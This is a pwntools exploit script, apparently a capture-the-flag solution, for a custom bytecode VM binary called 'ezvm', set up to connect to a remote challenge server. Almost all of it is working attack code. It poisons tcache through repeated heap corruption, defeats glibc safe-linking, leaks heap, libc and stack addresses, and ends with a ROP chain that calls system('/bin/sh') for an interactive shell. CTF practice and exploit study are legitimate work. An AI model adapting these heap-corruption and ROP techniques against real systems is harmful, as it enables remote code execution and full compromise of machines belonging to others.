#!/usr/bin/python

from pwn import *
import sys
from assemble import assemble_from_file, assemble_from_str

# remote_ip, port = '202.120.7.210', 40241
remote_ip, port = '47.252.3.1', 40241
binary = './ezvm_patched'
brkpts = '''
# b*$rebase(0x227a)
# b*$rebase(0x1603)
# b*$rebase(0x20b9)
b*$rebase(0x14d8)
# b atol
# b*$rebase(0x153c)
# b*$rebase(0x1669)
# b*$rebase(0x230a)
# b*$rebase(0x14d8)
# b malloc
c
''' # + 'c\n'*37

elf = ELF("ezvm_patched")
libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
# context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts)

else:
    io = process(binary)

def choice(idx):
    sla(":\n", str(idx))

def cont():
    sla("continue?\n", b"a"*8 + p64(0x1f0))

def choice2(data):
    sa(":\n", data)

if __name__ == "__main__":

    # Free 0x30 chunk at top of heap
    sl('a')
    choice(1)
    choice(0x28 // 8)
    choice2("\x17")

    # Free 2 0x60 chunks
    cont()
    choice(0x49)
    choice(0x50 // 8)
    choice2("\x00\x00"*(0x48 // 2) + "\x17")

    # Free smaller chunk (to overwrite tcache)
    cont()
    choice(1)
    choice(0x120 // 8)
    choice2("\x17")

    # Create overlap
    cont()
    bytecode = assemble_from_str("""
# Heap leak
REG_FROM_BSS r0 0x0
# Leak from safe linking
PUSH r0
SET_REG r2 0xc
PUSH r2
SHL
POP r0
# r0 - Heap base
PUSH r0
SET_REG r2 0x100
PUSH r2
ADD
# Perform safe linking
PUSH r0
SET_REG r2 0xc
PUSH r2
SHR
XOR
POP r1
# r1 contains safe-linked tcache struct
BSS_FROM_REG r1 0x6
# Put large chunk into tcache
SET_REG r2 0x3f1
BSS_FROM_REG r2 0x43
SET_REG r2 0x200
    """)
    choice(len(bytecode))

    # Get back 0x30 chunk with overflow
    choice((2**64 // 8) + (0x28 // 0x8))

    # Now 0x120 allocation gives us part of tcache struct
    choice2(bytecode)

    # Free 2 0x50 chunks
    cont()
    choice(0x39)
    choice(0x40 // 8)
    choice2("\x00\x00"*(0x38 // 2) + "\x17")

    # Free smaller chunk
    cont()
    choice(3)
    choice(0x1f0 // 8)
    choice2("\x00\x00\x17")

    # Free big chunk
    cont()
    choice(3)
    choice(0x420 // 8)
    choice2("\x00\x00\x17")

    # Phase 2 attack -> 0x50 tcache to fake libc chunk
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r0 0x62
PUSH r0
SET_REG r1 0x910
PUSH r1
SUB
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x31
BSS_FROM_REG r1 0xe
SET_REG r1 0x31
BSS_FROM_REG r1 0xd
PUSH r1
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    # Get back 0x3f0 chunk
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x51 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x48 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Arbitrary free in libc
    cont()
    bytecode = assemble_from_str("""
SET_REG r0 0x411
BSS_FROM_REG r0 0x5
SET_REG r0 0x7
BSS_FROM_REG r0 0x1
SET_REG r0 0x7
BSS_FROM_REG r0 0x2
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x48 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt Fd
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r0 0x63
PUSH r0
SET_REG r1 0x30
PUSH r1
ADD
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x21
BSS_FROM_REG r1 0xe
SET_REG r1 0x21
BSS_FROM_REG r1 0xd
PUSH r1
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x31 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x28 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Alloc and free 0x31 to get 0x410
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x28 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt 0x410 with 0x400
    cont()
    bytecode = assemble_from_str("""
SET_REG r0 0x401
BSS_FROM_REG r0 0x7d
SET_REG r2 0xff
QUIT
    """)
    choice(0x1f0)
    choice(0x408 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt Fd
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r0 0x63
PUSH r0
SET_REG r1 0x3f0
PUSH r1
ADD
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x41
BSS_FROM_REG r1 0xe
SET_REG r1 0x41
BSS_FROM_REG r1 0xd
PUSH r1
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x21 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x18 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Alloc and free 0x21 to get 0x400
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x18 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt 0x400 with 0x3e0
    cont()
    bytecode = assemble_from_str("""
SET_REG r0 0x3e1
BSS_FROM_REG r0 0x7b
SET_REG r2 0xff
QUIT
    """)
    choice(0x1f0)
    choice(0x3f8 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt Fd
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r0 0x63
PUSH r0
SET_REG r1 0x3e0
PUSH r1
ADD
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x131
BSS_FROM_REG r1 0xe
SET_REG r1 0x131
BSS_FROM_REG r1 0xd
PUSH r1
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x41 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x38 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Alloc and free 0x41 to get 0x3e0
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x38 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt 0x3e0 with 0x3d0
    cont()
    bytecode = assemble_from_str("""
SET_REG r0 0x3d1
BSS_FROM_REG r0 0x77
SET_REG r2 0xff
QUIT
    """)
    choice(0x1f0)
    choice(0x3d8 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Spray some allocations
    for i in [0x18, 0x28, 0x38]:
        cont()
        bytecode = assemble_from_str("""
    QUIT
        """)
        choice(0x1f0)
        choice(i // 8)
        choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Free big chunk for leaks
    cont()
    choice(3)
    choice(0x420 // 8)
    choice2("\x00\x00\x17")

    # Corrupt Fd
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r0 0x75
PUSH r0
SET_REG r1 0x2b0
PUSH r1
ADD
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x21
BSS_FROM_REG r1 0xe
SET_REG r1 0x21
BSS_FROM_REG r1 0xd
PUSH r1
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x131 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x128 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Alloc and free 0x131 to get 0x3d0
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x128 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt 0x3d0 with 0x3c0
    cont()
    bytecode = assemble_from_str("""
SET_REG r0 0x3c1
BSS_FROM_REG r0 0x75
QUIT
    """)
    choice(0x1f0)
    choice(0x3c8 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt Fd
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r0 0x75
PUSH r0
SET_REG r1 0x3b0
PUSH r1
ADD
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x31
BSS_FROM_REG r1 0xe
SET_REG r1 0x31
BSS_FROM_REG r1 0xd
PUSH r1
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x21 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x18 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Alloc and free 0x21 to get 0x3c0
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x18 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt 0x3c0 with 0x3b0
    cont()
    bytecode = assemble_from_str("""
SET_REG r0 0x3b1
BSS_FROM_REG r0 0x73
QUIT
    """)
    choice(0x1f0)
    choice(0x3b8 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt Fd
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r0 0x75
PUSH r0
SET_REG r1 0x3a0
PUSH r1
ADD
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x41
BSS_FROM_REG r1 0xe
SET_REG r1 0x41
BSS_FROM_REG r1 0xd
PUSH r1
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x31 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x28 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Alloc and free 0x31 to get 0x3b0
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x28 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Leak stack
    cont()
    bytecode = assemble_from_str("""
REG_FROM_BSS r0 0x68
PUSH r0
SET_REG r2 0x200
QUIT
    """)
    choice(0x1f0)
    choice(0x3a8 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Corrupt Fd
    cont()
    bytecode = assemble_from_str("""
# Libc ptr -> r0
REG_FROM_BSS r3 0x75
REG_FROM_BSS r0 0x74
PUSH r0
SET_REG r1 0x218
PUSH r1
SUB
POP r0
PUSH r0
# Heap ptr safe-link
REG_FROM_BSS r1 0x0
PUSH r1
XOR
POP r1
# Overwrite size with 0x51
BSS_FROM_REG r1 0xe
SET_REG r1 0x51
BSS_FROM_REG r1 0xd
QUIT
    """)
    choice(0x1f0)
    choice(0x3e0 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Get rid of 1 0x41 chunk
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x38 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # Alloc and free 0x41 to get 0x1f0 on stack
    cont()
    bytecode = assemble_from_str("""
QUIT
    """)
    choice(0x1f0)
    choice(0x38 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    # gdb.attach(io, brkpts)
    # Write ropchain
    cont()
    bytecode = assemble_from_str("""
SET_REG r1 0xab
REG_FROM_BSS r0 0x21
# pop rdi
PUSH r0
SET_REG r3 0x655
PUSH r3
ADD
POP r1
# binsh
PUSH r0
SET_REG r3 0x1ae908
PUSH r3
ADD
POP r2
BSS_FROM_REG r1 0x21
BSS_FROM_REG r2 0x22
# ret
PUSH r1
SET_REG r3 0x1
PUSH r3
ADD
POP r1
# system
PUSH r0
SET_REG r3 0x26fd0
PUSH r3
ADD
POP r2
BSS_FROM_REG r1 0x23
BSS_FROM_REG r2 0x24
QUIT
    """)
    choice(0x1f0)
    choice(0x1e8 // 8)
    choice2(bytecode.ljust(0x1f0, b"\x00"))

    sla("continue?\n", "bye bye\x00")

    io.interactive()
